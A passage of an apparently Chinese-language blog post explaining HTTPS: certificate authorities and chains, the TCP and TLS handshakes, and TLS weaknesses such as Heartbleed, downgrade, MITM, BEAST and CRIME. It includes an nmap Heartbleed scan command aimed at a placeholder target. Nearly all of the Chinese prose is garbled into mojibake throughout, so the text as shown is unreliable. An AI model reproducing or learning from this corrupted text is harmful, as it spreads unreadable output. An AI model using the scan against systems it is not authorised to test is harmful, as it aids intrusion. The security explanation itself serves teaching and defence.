´äº§çš„é£é™©ï¼‰ã€‚è·Ÿé“¶è¡Œä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯ä¿¡çš„æœºæ„æ¥é¢å‘è¯ä¹¦å’Œæä¾›å…¬é’¥ï¼Œåªè¦æ˜¯å®ƒæä¾›çš„å…¬é’¥ï¼Œæˆ‘ä»¬å°±ç›¸ä¿¡æ˜¯åˆæ³•çš„ã€‚</p><p>è¿™ç§æœºæ„ç§°ä¸ºè®¤è¯æœºæ„(Certification Authorityï¼Œ CA)ã€‚CAå°±æ˜¯èƒ½å¤Ÿè®¤å®šâ€å…¬é’¥ç¡®å®å±äºæ­¤äººâ€ï¼Œå¹¶èƒ½ç”Ÿæˆå…¬é’¥çš„æ•°å­—ç­¾åçš„ç»„ç»‡æˆ–æœºæ„ã€‚CAæœ‰å›½é™…æ€§ç»„ç»‡å’Œæ”¿åºœè®¾ç«‹çš„ç»„ç»‡ï¼Œä¹Ÿæœ‰é€šè¿‡æä¾›è®¤è¯æœåŠ¡æ¥ç›ˆåˆ©çš„ç»„ç»‡ã€‚</p><p><img src="https://cdn.annevi.cn/image-20210205154525604.png" alt="image-20210205154525604" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210205154525604.png" class="lozad post-image"></p><h4 id="è¯ä¹¦é“¾"><a href="#è¯ä¹¦é“¾" class="headerlink" title="è¯ä¹¦é“¾"></a>è¯ä¹¦é“¾</h4><p>è¯ä¹¦é“¾ï¼Œä¹Ÿç§°ä¸ºè¯ä¹¦è·¯å¾„ï¼Œæ˜¯ç”¨äºè®¤è¯å®ä½“åˆæ³•èº«ä»½çš„è¯ä¹¦åˆ—è¡¨ï¼Œå…·ä½“åˆ° HTTPS é€šä¿¡ä¸­ï¼Œå°±æ˜¯ä¸ºäº†éªŒè¯æœåŠ¡å™¨çš„åˆæ³•èº«ä»½ã€‚ä¹‹æ‰€ä»¥ä½¿ç”¨è¯ä¹¦é“¾ï¼Œæ˜¯ä¸ºäº†ä¿è¯æ ¹è¯ä¹¦ çš„å®‰å…¨ï¼Œä¸­é—´å±‚å¯ä»¥çœ‹åšæ ¹è¯ä¹¦çš„ä»£ç†ï¼Œèµ·åˆ°äº†ç¼“å†²çš„ä½œç”¨ã€‚</p><h3 id="ä»ç»å…¸é—®é¢˜è°ˆèµ·"><a href="#ä»ç»å…¸é—®é¢˜è°ˆèµ·" class="headerlink" title="ä»ç»å…¸é—®é¢˜è°ˆèµ·"></a>ä»ç»å…¸é—®é¢˜è°ˆèµ·</h3><p>æˆ‘ä»¬ä»ä¸€ä¸ªç»å…¸çš„é—®é¢˜å¼€å§‹ï¼š<strong>å½“æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªå¯ç”¨äº†httpsçš„åŸŸååˆ°æˆ‘ä»¬çœ‹åˆ°é¡µé¢å›æ˜¾ï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</strong></p><p>åœ¨ä»¥å¾€httpçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆç›¸ä¿¡è®¸å¤šäººå·²ç»éå¸¸æ¸…æ™°äº†ï¼Œä½†æ˜¯è‹¥ç›®æ ‡ç«™ç‚¹å¯ç”¨äº†httpsï¼Œåˆä¼šæœ‰ä»€ä¹ˆä¸ä¸€æ ·çš„åœ°æ–¹å‘¢ï¼Ÿ</p><p>å¸¦ç€è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é‡æ–°æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªâ€œåŠ å¼ºç‰ˆâ€çš„ç»å…¸é¢è¯•é¢˜ã€‚</p><h4 id="åŸŸåè§£æ"><a href="#åŸŸåè§£æ" class="headerlink" title="åŸŸåè§£æ"></a>åŸŸåè§£æ</h4><p>ç”±äºwebæœåŠ¡æ˜¯å»ºç«‹åœ¨TCPåè®®ä¹‹ä¸Šçš„ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ipåœ°å€æ¥è¿›è¡Œé€šä¿¡ï¼Œè€ŒåŸŸåè§£æå°±æ˜¯é€šè¿‡åŸŸåå»DNSæœåŠ¡å™¨æŸ¥è¯¢è·å–å¯¹åº”çš„IPçš„è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯è¿™ä¸ªç»å…¸é—®é¢˜çš„ç¬¬ä¸€æ­¥ã€‚</p><h4 id="å»ºç«‹TCPè¿æ¥"><a href="#å»ºç«‹TCPè¿æ¥" class="headerlink" title="å»ºç«‹TCPè¿æ¥"></a>å»ºç«‹TCPè¿æ¥</h4><p>æµè§ˆå™¨æ‹¿åˆ°å¯¹åº”åŸŸåçš„IPåœ°å€åï¼Œå‡†å¤‡å‘ç›®æ ‡æœåŠ¡å™¨å‘èµ·è¿æ¥è¯·æ±‚ï¼Œç”±äºæˆ‘ä»¬æ˜¯å‘webæœåŠ¡å™¨å‘èµ·è¿æ¥ï¼Œå› æ­¤æ˜¯é€šè¿‡TCPåè®®è¿›è¡Œè¿æ¥çš„ï¼Œè‡ªç„¶ä¹Ÿå°±æœ‰TCPçš„ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥çš„è¿‡ç¨‹ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>wireshark</code>æŠ“åŒ…æ¥æŸ¥çœ‹è¿™ä¸€è¿‡ç¨‹ã€‚</p><p><img src="https://cdn.annevi.cn/image-20210209111021113.png" alt="image-20210209111021113" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210209111021113.png" class="lozad post-image"></p><p>é€šè¿‡è®¾ç½®ç®€å•çš„è¿‡æ»¤å™¨ï¼Œè®¿é—®<code>https://annevi.cn</code>å³å¯è·å–åˆ°ä¸‰æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹ã€‚æˆ‘ä»¬é¡ºå¸¦æ¥å…·ä½“çš„çœ‹ä¸€ä¸‹ã€‚</p><ol><li>é¦–å…ˆæ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ª<code>SYN</code>ï¼Œè¡¨ç¤ºè¦æ±‚å»ºç«‹è¿æ¥ï¼ŒåŒæ—¶å‘é€<code>Seq=0</code>,éšåå®¢æˆ·ç«¯è¿›å…¥<code>SYN-SENT</code>é˜¶æ®µã€‚</li><li>æœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„TCPæŠ¥æ–‡ä¹‹åï¼Œç»“æŸLISTENé˜¶æ®µã€‚å¹¶è¿”å›ä¸€æ®µTCPæŠ¥æ–‡ï¼Œæ„é€ ä¸€ä¸ª<code>[SYN ACK]</code>çš„æ•°æ®åŒ…ï¼ŒåŒæ—¶å°†ackå€¼è®¾ä¸º<code>seq+1</code>ã€‚éšåæœåŠ¡å™¨ç«¯è¿›å…¥SYN-RCVDé˜¶æ®µã€‚</li><li>å®¢æˆ·ç«¯æ¥æ”¶åˆ°æ¥è‡ªæœåŠ¡å™¨ç«¯çš„ç¡®è®¤æ”¶åˆ°æ•°æ®çš„TCPæŠ¥æ–‡ä¹‹åï¼Œæ˜ç¡®äº†ä»å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„æ•°æ®ä¼ è¾“æ˜¯æ­£å¸¸çš„ï¼Œç»“æŸSYN-SENTé˜¶æ®µã€‚å¹¶è¿”å›æœ€åä¸€æ®µTCPæŠ¥æ–‡,è®¾ç½®<code>seq+=1</code> ackåˆ™ç­‰äºæœåŠ¡å™¨ç«¯æ•°æ®åŒ…çš„<code>seq+1</code>,éšåå®¢æˆ·ç«¯è¿›å…¥ESTABLISHEDé˜¶æ®µã€‚</li></ol><p>å®Œæˆä¸Šè¿°åŸºæœ¬æ­¥éª¤åï¼Œä¸€ä¸ªå®Œæ•´çš„TCPè¿æ¥å°±æˆåŠŸå»ºç«‹äº†</p><p><img src="https://cdn.annevi.cn/861fa058f2da35f8efa70b29bf7c45fd8689.gif" alt="img" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/861fa058f2da35f8efa70b29bf7c45fd8689.gif" class="lozad post-image"></p><h4 id="TLSæ¡æ‰‹"><a href="#TLSæ¡æ‰‹" class="headerlink" title="TLSæ¡æ‰‹*"></a>TLSæ¡æ‰‹*</h4><p>ä¸ºäº†å»ºç«‹å®‰å…¨è¿æ¥ï¼Œé€šä¿¡åŒæ–¹åœ¨å®ŒæˆTCPçš„ä¸‰æ¬¡æ¡æ‰‹ä¹‹åï¼Œç´§æ¥ç€å°±è¦è¿›è¡ŒTLSçš„<strong>å››æ¬¡æ¡æ‰‹</strong>ï¼ŒTLSæ¡æ‰‹çš„<strong>ç›®çš„</strong>ä¸»è¦æ˜¯ä¸ºäº†ï¼š</p><ul><li>å•†å®šåŒæ–¹é€šä¿¡æ‰€ä½¿ç”¨çš„çš„ TLS ç‰ˆæœ¬ (ä¾‹å¦‚ TLS1.0, 1.2, 1.3ç­‰ç­‰)ï¼›</li><li>ç¡®å®šåŒæ–¹æ‰€è¦ä½¿ç”¨çš„å¯†ç ç»„åˆï¼›</li><li>å®¢æˆ·ç«¯é€šè¿‡æœåŠ¡å™¨çš„å…¬é’¥å’Œæ•°å­—è¯ä¹¦ä¸Šçš„æ•°å­—ç­¾åéªŒè¯æœåŠ¡ç«¯çš„èº«ä»½ï¼›</li><li>ç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œè¯¥å¯†é’¥å°†ç”¨äºæ¡æ‰‹ç»“æŸåçš„å¯¹ç§°åŠ å¯†ã€‚</li></ul><p><img src="https://cdn.annevi.cn/70.png" alt="img" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/70.png" class="lozad post-image"></p><p>ä¸‹é¢å°†ä»‹ç»ä¸€ä¸‹TLSæ¡æ‰‹çš„è¿‡ç¨‹</p><h5 id="Client-Hello"><a href="#Client-Hello" class="headerlink" title="Client Hello"></a>Client Hello</h5><p>å®¢æˆ·ç«¯ç”Ÿæˆå¹¶å‘é€ä¸€æ®µéšæœºå­—ç¬¦ä¸²ä»¥åŠæ‰€æ”¯æŒçš„åŠ å¯†ç®—æ³•ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://cdn.annevi.cn/image-20210214185926765.png" alt="image-20210214185926765" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210214185926765.png" class="lozad post-image"></p><h5 id="Server-Hello"><a href="#Server-Hello" class="headerlink" title="Server Hello"></a>Server Hello</h5><p>æœåŠ¡å™¨å‘é€â€Server Helloâ€æ¶ˆæ¯å¯¹å®¢æˆ·ç«¯è¿›è¡Œå›åº”ï¼Œè¯¥æ¶ˆæ¯åŒ…å«äº†<strong>æ•°å­—è¯ä¹¦</strong>ï¼ŒæœåŠ¡å™¨é€‰æ‹©çš„å¯†ç ç»„åˆå’Œâ€server randomâ€éšæœºå­—ç¬¦ä¸²</p><p><img src="https://cdn.annevi.cn/image-20210214185419536.png" alt="image-20210214185419536" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210214185419536.png" class="lozad post-image"></p><h5 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h5><p>å®¢æˆ·ç«¯å¯¹æœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼Œç¡®ä¿å¯¹æ–¹çš„åˆæ³•èº«ä»½ï¼ŒéªŒè¯è¿‡ç¨‹å¯ä»¥ç»†åŒ–ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li>æ£€æŸ¥æ•°å­—ç­¾å</li><li>éªŒè¯è¯ä¹¦é“¾</li><li>æ£€æŸ¥è¯ä¹¦çš„æœ‰æ•ˆæœŸ</li><li>æ£€æŸ¥è¯ä¹¦çš„æ’¤å›çŠ¶æ€ (æ’¤å›ä»£è¡¨è¯ä¹¦å·²å¤±æ•ˆ)</li></ol><h5 id="Pre-master-secret"><a href="#Pre-master-secret" class="headerlink" title="Pre-master secret"></a>Pre-master secret</h5><p>å®¢æˆ·ç«¯åœ¨å‰é¢çš„æ­¥éª¤ä¸­å·²ç»è·å–åˆ°äº†æœåŠ¡ç«¯æ‰€ç»™äºˆçš„å…¬é’¥ï¼Œå› æ­¤å°±å¯ä»¥å‘é€ä½¿ç”¨è¿™ä¸ªå…¬é’¥åŠ å¯†ä¹‹åçš„å¦ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²â€pre-master secret (é¢„ä¸»å¯†é’¥)â€ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯ç»è¿‡æœåŠ¡å™¨çš„å…¬é’¥åŠ å¯†è¿‡çš„ï¼Œåªæœ‰å¯¹åº”çš„ç§é’¥æ‰èƒ½è§£å¯†ã€‚</p><h5 id="è§£å¯†-Pre-master-secret"><a href="#è§£å¯†-Pre-master-secret" class="headerlink" title="è§£å¯† Pre-master secret"></a>è§£å¯† Pre-master secret</h5><p>æœåŠ¡å™¨ä½¿ç”¨ç§é’¥è§£å¯†<code>Pre-master secret</code>,è·å–å…¶æ˜æ–‡ã€‚</p><h5 id="ç”Ÿæˆå…±äº«å¯†é’¥"><a href="#ç”Ÿæˆå…±äº«å¯†é’¥" class="headerlink" title="ç”Ÿæˆå…±äº«å¯†é’¥"></a>ç”Ÿæˆå…±äº«å¯†é’¥</h5><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å‡ä½¿ç”¨ <code>client random</code>ï¼Œ<code>server random</code> å’Œ <code>premaster secret</code>ï¼Œå¹¶é€šè¿‡ç›¸åŒçš„ç®—æ³•ç”Ÿæˆç›¸åŒçš„å…±äº«å¯†é’¥ <strong>KEY</strong>ï¼Œç”¨äºåé¢çš„å¯¹ç§°åŠ å¯†ä¼ è¾“ã€‚</p><h5 id="å®¢æˆ·ç«¯å°±ç»ª"><a href="#å®¢æˆ·ç«¯å°±ç»ª" class="headerlink" title="å®¢æˆ·ç«¯å°±ç»ª"></a><strong>å®¢æˆ·ç«¯å°±ç»ª</strong></h5><p>å®¢æˆ·ç«¯å‘é€ç»è¿‡å…±äº«å¯†é’¥ <strong>KEY</strong>åŠ å¯†è¿‡çš„ <code>finished</code>ä¿¡å·ã€‚</p><h5 id="æœåŠ¡ç«¯å°±ç»ª"><a href="#æœåŠ¡ç«¯å°±ç»ª" class="headerlink" title="æœåŠ¡ç«¯å°±ç»ª"></a>æœåŠ¡ç«¯å°±ç»ª</h5><p>æœåŠ¡å™¨å‘é€ç»è¿‡å…±äº«å¯†é’¥ **KEY **åŠ å¯†è¿‡çš„<code>finished</code>ä¿¡å·ã€‚</p><h5 id="è¾¾æˆå®‰å…¨é€šä¿¡"><a href="#è¾¾æˆå®‰å…¨é€šä¿¡" class="headerlink" title="è¾¾æˆå®‰å…¨é€šä¿¡"></a><strong>è¾¾æˆå®‰å…¨é€šä¿¡</strong></h5><p>æ¡æ‰‹å®Œæˆï¼ŒåŒæ–¹<strong>ä½¿ç”¨å¯¹ç§°åŠ å¯†</strong>è¿›è¡Œå®‰å…¨é€šä¿¡ã€‚</p><hr><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æ€»çš„æ¥è¯´ï¼ŒTLSçš„å››æ¬¡æ¡æ‰‹ä¸»è¦æ¦‚æ‹¬å¦‚ä¸‹ï¼š</p><p>å®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚ï¼Œå‘æœåŠ¡ç«¯æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ol><li>æ”¯æŒçš„åè®®ç‰ˆæœ¬ï¼Œæ¯”å¦‚ TLS 1.0 ç‰ˆã€‚</li><li>ä¸€ä¸ªå®¢æˆ·ç«¯ç”Ÿæˆçš„éšæœºæ•°ï¼Œç¨åç”¨äºç”Ÿæˆâ€å¯¹è¯å¯†é’¥â€ã€‚</li><li>æ”¯æŒçš„åŠ å¯†æ–¹æ³•ï¼Œæ¯”å¦‚ RSA å…¬é’¥åŠ å¯†ã€‚</li><li>æ”¯æŒçš„å‹ç¼©æ–¹æ³•ã€‚</li></ol><p>æœåŠ¡å™¨å›åº”ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ol><li>ç¡®è®¤ä½¿ç”¨çš„åŠ å¯†é€šä¿¡åè®®ç‰ˆæœ¬ï¼Œæ¯”å¦‚ TLS 1.0 ç‰ˆæœ¬ã€‚å¦‚æœæµè§ˆå™¨ä¸æœåŠ¡å™¨æ”¯æŒçš„ç‰ˆæœ¬ä¸ä¸€è‡´ï¼ŒæœåŠ¡å™¨å…³é—­åŠ å¯†é€šä¿¡ã€‚</li><li>ç¡®è®¤ä½¿ç”¨çš„åŠ å¯†æ–¹æ³•ï¼Œæ¯”å¦‚ RSA å…¬é’¥åŠ å¯†ï¼Œè¿”å›åŠ å¯†å…¬é’¥</li><li>æœåŠ¡å™¨è¯ä¹¦</li></ol><p>å®¢æˆ·ç«¯å›åº”</p><ol><li>éªŒè¯è¯ä¹¦çš„åˆæ³•æ€§ï¼ˆé¢å‘è¯ä¹¦çš„æœºæ„æ˜¯å¦åˆæ³•ï¼Œè¯ä¹¦ä¸­åŒ…å«çš„ç½‘ç«™åœ°å€æ˜¯å¦ä¸æ­£åœ¨è®¿é—®çš„åœ°å€ä¸€è‡´ç­‰ï¼‰ï¼Œå¦‚æœè¯ä¹¦å—ä¿¡ä»»ï¼Œåˆ™æµè§ˆå™¨æ é‡Œé¢ä¼šæ˜¾ç¤ºä¸€ä¸ªå°é”å¤´ï¼Œå¦åˆ™ä¼šç»™å‡ºè¯ä¹¦ä¸å—ä¿¡çš„æç¤ºã€‚</li><li>å¦‚æœè¯ä¹¦å—ä¿¡ä»»ï¼Œæˆ–è€…æ˜¯ç”¨æˆ·æ¥å—äº†ä¸å—ä¿¡çš„è¯ä¹¦ï¼Œæµè§ˆå™¨ä¼šç”Ÿæˆä¸€ä¸²éšæœºæ•°çš„å¯†ç ï¼Œå¹¶ç”¨è¯ä¹¦ä¸­æä¾›çš„å…¬é’¥åŠ å¯†ã€‚</li><li>ä½¿ç”¨çº¦å®šå¥½çš„ HASH è®¡ç®—æ¡æ‰‹æ¶ˆæ¯ï¼Œå¹¶ä½¿ç”¨ç”Ÿæˆçš„éšæœºæ•°å¯¹æ¶ˆæ¯è¿›è¡ŒåŠ å¯†ï¼Œæœ€åå°†ä¹‹å‰ç”Ÿæˆçš„æ‰€æœ‰ä¿¡æ¯å‘é€ç»™ç½‘ç«™ã€‚</li></ol><p>æœåŠ¡å™¨</p><ol><li>ä½¿ç”¨è‡ªå·±çš„ç§é’¥å°†ä¿¡æ¯è§£å¯†å–å‡ºå¯†ç ï¼Œä½¿ç”¨å¯†ç è§£å¯†æµè§ˆå™¨å‘æ¥çš„æ¡æ‰‹æ¶ˆæ¯ï¼Œå¹¶éªŒè¯æ˜¯å¦ä¸æµè§ˆå™¨å‘æ¥çš„ä¸€è‡´ã€‚</li><li>ä½¿ç”¨å¯†ç åŠ å¯†ä¸€æ®µæ¡æ‰‹æ¶ˆæ¯ï¼Œå‘é€ç»™æµè§ˆå™¨ã€‚</li></ol><p><img src="https://cdn.annevi.cn/bVbCCMD.png" alt="SSL : TLS æ¡æ‰‹è¿‡ç¨‹" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/bVbCCMD.png" class="lozad post-image"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œhttps å»ºç«‹è¿æ¥éœ€è¦7æ¬¡æ¡æ‰‹(TCP 3æ¬¡ TLS 4æ¬¡)</p><h2 id="TLS-çš„å®‰å…¨é—®é¢˜"><a href="#TLS-çš„å®‰å…¨é—®é¢˜" class="headerlink" title="TLS çš„å®‰å…¨é—®é¢˜"></a>TLS çš„å®‰å…¨é—®é¢˜</h2><h3 id="OpenSSLå¿ƒè„æ»´è¡€æ¼æ´"><a href="#OpenSSLå¿ƒè„æ»´è¡€æ¼æ´" class="headerlink" title="OpenSSLå¿ƒè„æ»´è¡€æ¼æ´"></a>OpenSSLå¿ƒè„æ»´è¡€æ¼æ´</h3><blockquote><p>2014å¹´4æœˆ8æ—¥ï¼Œäº’è”ç½‘ä¸Šæ›å‡ºäº†ä¸¥é‡ä¸€ä¸ªæ¼æ´ç§°ä¸ºHeartbleedï¼Œè¯¥æ¼æ´ç”±å®‰å…¨å…¬å¸Codenomiconå’Œè°·æ­Œå®‰å…¨å·¥ç¨‹å¸ˆå‘ç°ã€‚Heartbleedæ¼æ´ï¼Œé€ æˆè®¸ä»»ä½•äººåœ¨äº’è”ç½‘ä¸Šé˜…è¯»ç³»ç»Ÿçš„å†…å­˜ä¿æŠ¤è„†å¼±çš„OpenSSLçš„è½¯ä»¶ç‰ˆæœ¬ã€‚ è¿™ç§å¦¥åå¯†é’¥ç”¨äºè¯†åˆ«æœåŠ¡æä¾›è€…å’ŒåŠ å¯†æµé‡,ç”¨æˆ·åå’Œå¯†ç çš„å’Œå®é™…çš„å†…å®¹ã€‚ è¿™å…è®¸æ”»å‡»è€…çªƒå¬é€šä¿¡ã€çªƒå–æ•°æ®ç›´æ¥ä»æœåŠ¡å’Œç”¨æˆ·å’Œæ¨¡æ‹ŸæœåŠ¡å’Œç”¨æˆ·ã€‚</p></blockquote><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>OpenSSL åœ¨å®ç° TLS å’Œ DTLS çš„å¿ƒè·³å¤„ç†é€»è¾‘æ—¶ï¼Œå­˜åœ¨ç¼–ç ç¼ºé™·ã€‚OpenSSL çš„å¿ƒè·³å¤„ç†é€»è¾‘æ²¡æœ‰æ£€æµ‹å¿ƒè·³åŒ…ä¸­çš„é•¿åº¦å­—æ®µæ˜¯å¦å’Œåç»­çš„æ•°æ®å­—æ®µç›¸ç¬¦åˆï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç‚¹ï¼Œæ„é€ å¼‚å¸¸çš„æ•°æ®åŒ…ï¼Œæ¥è·å–å¿ƒè·³æ•°æ®æ‰€åœ¨çš„å†…å­˜åŒºåŸŸçš„åç»­æ•°æ®ã€‚è¿™äº›æ•°æ®ä¸­å¯èƒ½åŒ…å«äº†è¯ä¹¦ç§é’¥ã€ç”¨æˆ·åã€ç”¨æˆ·å¯†ç ã€ç”¨æˆ·é‚®ç®±ç­‰æ•æ„Ÿä¿¡æ¯ã€‚è¯¥æ¼æ´å…è®¸æ”»å‡»è€…ï¼Œä»å†…å­˜ä¸­è¯»å–å¤šè¾¾64KBçš„æ•°æ®ã€‚</p><h4 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h4><ul><li>ä½¿ç”¨äº†opensslæ‰©å±•åº“åŠ å¯†çš„ç½‘ç»œåè®®</li><li>https</li><li>SSL VPN</li><li>é‚®ä»¶æœåŠ¡å™¨</li></ul><h4 id="æµ‹è¯•æ–¹æ¡ˆ"><a href="#æµ‹è¯•æ–¹æ¡ˆ" class="headerlink" title="æµ‹è¯•æ–¹æ¡ˆ"></a>æµ‹è¯•æ–¹æ¡ˆ</h4><p>nmap</p><pre class="line-numbers language-none"><code class="language-none">nmap -sV -p 443 --script ssl-heartbleed.nse [Target]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://filippo.io/Heartbleed/">https://filippo.io/Heartbleed/</a></p><p><a href="http://wangzhan.360.cn/heartbleed/">http://wangzhan.360.cn/heartbleed/</a></p><h3 id="Downgradeï¼ˆé™çº§æ”»å‡»ï¼‰"><a href="#Downgradeï¼ˆé™çº§æ”»å‡»ï¼‰" class="headerlink" title="Downgradeï¼ˆé™çº§æ”»å‡»ï¼‰"></a>Downgradeï¼ˆé™çº§æ”»å‡»ï¼‰</h3><p>é™çº§æ”»å‡»æ˜¯ä¸€ç§å¯¹è®¡ç®—æœºç³»ç»Ÿæˆ–è€…é€šä¿¡åè®®çš„æ”»å‡»ï¼Œåœ¨é™çº§æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…æ•…æ„ä½¿ç³»ç»Ÿæ”¾å¼ƒæ–°å¼ã€å®‰å…¨æ€§é«˜çš„å·¥ä½œæ–¹å¼ï¼Œåè€Œä½¿ç”¨ä¸ºå‘ä¸‹å…¼å®¹è€Œå‡†å¤‡çš„è€å¼ã€å®‰å…¨æ€§å·®çš„å·¥ä½œæ–¹å¼ï¼Œé™çº§æ”»å‡»å¸¸è¢«ç”¨äºä¸­é—´äººæ”»å‡»ï¼Œè®²åŠ å¯†çš„é€šä¿¡åè®®å®‰å…¨æ€§å¤§å¹…å‰Šå¼±ï¼Œå¾—ä»¥è¿›è¡ŒåŸæœ¬ä¸å¯èƒ½åšåˆ°çš„æ”»å‡»ã€‚ åœ¨ç°ä»£çš„å›é€€é˜²å¾¡ä¸­ï¼Œä½¿ç”¨å•ç‹¬çš„ä¿¡å·å¥—ä»¶æ¥æŒ‡ç¤ºè‡ªæ„¿é™çº§è¡Œä¸ºï¼Œéœ€è¦ç†è§£è¯¥ä¿¡å·å¹¶æ”¯æŒæ›´é«˜åè®®ç‰ˆæœ¬çš„æœåŠ¡å™¨æ¥ç»ˆæ­¢åå•†ï¼Œè¯¥å¥—ä»¶æ˜¯ TLS_FALLBACK_SCSV(0x5600)</p><h3 id="MITMï¼ˆä¸­é—´äººæ”»å‡»ï¼‰"><a href="#MITMï¼ˆä¸­é—´äººæ”»å‡»ï¼‰" class="headerlink" title="MITMï¼ˆä¸­é—´äººæ”»å‡»ï¼‰"></a>MITMï¼ˆä¸­é—´äººæ”»å‡»ï¼‰</h3><p>MITM(Man-in-the-MiddleAttack) ï¼Œæ˜¯æŒ‡æ”»å‡»è€…ä¸é€šè®¯çš„ä¸¤ç«¯åˆ†åˆ«åˆ›å»ºç‹¬ç«‹çš„è”ç³»ï¼Œå¹¶äº¤æ¢å…¶æ‰€æœ‰æ”¶åˆ°çš„æ•°æ®ï¼Œä½¿é€šè®¯çš„ä¸¤ç«¯è®¤ä¸ºä»–ä»¬æ­£åœ¨é€šè¿‡ä¸€ä¸ªç§å¯†çš„è¿æ¥ä¸å¯¹æ–¹ç›´æ¥å¯¹è¯ï¼Œä½†äº‹å®ä¸Šæ•´ä¸ªå¯¹è¯éƒ½è¢«æ”»å‡»è€…å®Œå…¨æ§åˆ¶ï¼Œåœ¨ä¸­é—´äººæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æ‹¦æˆªé€šè®¯åŒæ–¹çš„é€šè¯å¹¶æ’å…¥æ–°çš„å†…å®¹ã€‚ä¸€ä¸ªä¸­é—´äººæ”»å‡»èƒ½æˆåŠŸçš„å‰ææ¡ä»¶æ˜¯æ”»å‡»è€…èƒ½å¤Ÿå°†è‡ªå·±ä¼ªè£…æˆæ¯ä¸ªå‚ä¸ä¼šè¯çš„ç»ˆç«¯ï¼Œå¹¶ä¸”ä¸è¢«å…¶ä»–ç»ˆç«¯è¯†ç ´ã€‚</p><h3 id="BEAST-é‡å…½æ”»å‡»ï¼‰"><a href="#BEAST-é‡å…½æ”»å‡»ï¼‰" class="headerlink" title="BEAST (é‡å…½æ”»å‡»ï¼‰"></a>BEAST (é‡å…½æ”»å‡»ï¼‰</h3><p>BEAST(CVE-2011-3389) BEASTæ˜¯ä¸€ç§æ˜æ–‡æ”»å‡»ï¼Œé€šè¿‡ä»SSL/TLSåŠ å¯†çš„ä¼šè¯ä¸­è·å–å—å®³è€…çš„COOKIEå€¼ï¼ˆé€šè¿‡è¿›è¡Œä¸€æ¬¡ä¼šè¯åŠ«æŒæ”»å‡»ï¼‰ï¼Œè¿›è€Œç¯¡æ”¹ä¸€ä¸ªåŠ å¯†ç®—æ³•çš„ CBCï¼ˆå¯†ç å—é“¾ï¼‰çš„æ¨¡å¼ä»¥å®ç°æ”»å‡»ç›®å½•ï¼Œå…¶ä¸»è¦é’ˆå¯¹TLS1.0å’Œæ›´æ—©ç‰ˆæœ¬çš„åè®®ä¸­çš„å¯¹ç§°åŠ å¯†ç®—æ³•CBCæ¨¡å¼ã€‚</p><h3 id="CRIMEï¼ˆç½ªæ¶æ”»å‡»ï¼‰"><a href="#CRIMEï¼ˆç½ªæ¶æ”»å‡»ï¼‰" class="headerlink" title="CRIMEï¼ˆç½ªæ¶æ”»å‡»ï¼‰"></a>CRIMEï¼ˆç½ªæ¶æ”»å‡»ï¼‰</h3><p>CRIME(CVE-2012-4929)ï¼Œå…¨ç§°Compression Ratio Info-leak Made Easyï¼Œè¿™æ˜¯ä¸€ç§å› SSLå‹ç¼©é€ 